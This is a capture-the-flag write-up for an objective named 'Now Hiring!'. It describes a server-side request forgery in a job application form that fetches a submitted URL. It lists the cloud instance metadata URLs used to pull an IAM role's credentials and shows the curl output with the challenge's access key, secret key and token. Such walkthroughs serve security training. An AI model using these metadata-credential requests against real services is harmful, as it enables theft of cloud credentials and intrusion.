<h1 id="objective-10-now-hiring">Objective 10: Now Hiring!</h1>
<p><strong>Location: <a href="https://apply.jackfrosttower.com/">https://apply.jackfrosttower.com/</a></strong><br>
<strong>Elf: ?</strong></p>
<p>This objective is about SSRF.</p>
<p>The website’s application form consumes the user’s name, resume (as file upload) and the URL to the public NLBI report.</p>
<p>After the submission, the item retrieved through this URL by the website is shown on the “submission accepted” screen using the URL <a href="https://apply.jackfrosttower.com/images/%7Busername%7D.jpg">https://apply.jackfrosttower.com/images/{username}.jpg</a></p>
<p>By choosing the right IMDS URLs, the secret access key for the S3 bucket can be retrieved using CURL:</p>
<p>URL 1 (get role name):</p>
<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials
</code></pre>
<p>URL 2 (get security credentials for this role):</p>
<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role
</code></pre>
<pre><code>jsw@io:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
{
	"Code": "Success",
	"LastUpdated": "2021-05-02T18:50:40Z",
	"Type": "AWS-HMAC",
	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
	"Expiration": "2026-05-02T18:50:40Z"
}
</code></pre>
<p>So the secret access key for the S3 bucket is <strong>CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX</strong></p>

